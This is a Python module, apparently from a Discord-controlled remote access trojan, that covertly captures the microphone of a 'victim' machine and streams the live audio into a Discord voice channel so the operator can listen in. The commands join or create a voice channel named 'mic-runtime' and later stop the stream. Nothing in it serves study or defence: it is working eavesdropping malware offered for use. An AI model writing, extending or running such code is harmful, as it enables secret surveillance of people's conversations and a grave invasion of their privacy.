"""Stream the microphone of the victim into a Discord voice channel.

The runtime joins a voice channel of the guild and plays the microphone of
the victim as a live stream, so the owner can listen in. The audio comes
from the shared capture, the same one the recorder uses, so the microphone
is only opened once.
"""

import discord
from discord.ext import commands
from discord.ext.commands import Context

from src.cmd.microphone import close_capture, ensure_capture
from src.utils.opus import ensure_opus


class MicrophoneSource(discord.AudioSource):
    """Plays the microphone of the machine as a voice stream."""

    def __init__(self) -> None:
        super().__init__()

        self.capture = ensure_capture()

    def read(self) -> bytes:
        """Return 20ms of audio, silence when the microphone is quiet."""
        return self.capture.read_block()

    def close(self) -> None:
        """Stop the stream, the microphone stays open for the recorder."""


# The voice connection of the current session.
_voice_client: discord.VoiceProtocol | None = None
_source: MicrophoneSource | None = None


async def join_voice(ctx: Context[commands.Bot]) -> None:
    """Join a voice channel and stream the microphone of the victim."""
    global _voice_client, _source

    if _voice_client is not None and _voice_client.is_connected():
        await ctx.reply("The runtime is already streaming into a voice channel.")
        return

    # The opus library is not part of Python, the helper looks for it.
    library = ensure_opus()

    if library is None and not discord.opus.is_loaded():
        await ctx.reply(
            "The opus library is missing, the voice stream cannot be encoded. "
            "Place `libopus-0.x64.dll` next to the executable and try again."
        )
        return

    print(f"Voice stream uses the opus library: {library}")

    guild = ctx.guild

    if guild is None:
        await ctx.reply("This command only works inside a server.")
        return

    # A voice channel of the guild is used, one is created when there is none.
    voice_channel = next(
        (item for item in guild.voice_channels if item.name.startswith("mic-")),
        None,
    )

    if voice_channel is None:
        voice_channel = await guild.create_voice_channel("mic-runtime")
        await ctx.reply(f"Created the voice channel {voice_channel.mention}.")

    try:
        _source = MicrophoneSource()
        _voice_client = await voice_channel.connect(self_deaf=True)
        _voice_client.play(_source)
    except Exception as exc:
        print(f"Voice stream error: {exc}")

        _source = None
        _voice_client = None
        await ctx.reply(f"Could not start the voice stream: {type(exc).__name__}: {exc}")
        return

    await ctx.reply(
        f"Streaming the microphone (`{_source.capture.name}`) into "
        f"{voice_channel.mention}."
    )


async def leave_voice(ctx: Context[commands.Bot]) -> None:
    """Stop the voice stream and leave the voice channel."""
    global _voice_client, _source

    if _voice_client is None:
        await ctx.reply("The runtime is not in a voice channel.")
        return

    try:
        _voice_client.stop()
    except Exception:
        pass

    try:
        await _voice_client.disconnect()
    except Exception as exc:
        print(f"Could not leave the voice channel: {exc}")

    _source = None
    _voice_client = None

    # The microphone is released, another program can use it again.
    close_capture()

    await ctx.reply("Left the voice channel.")
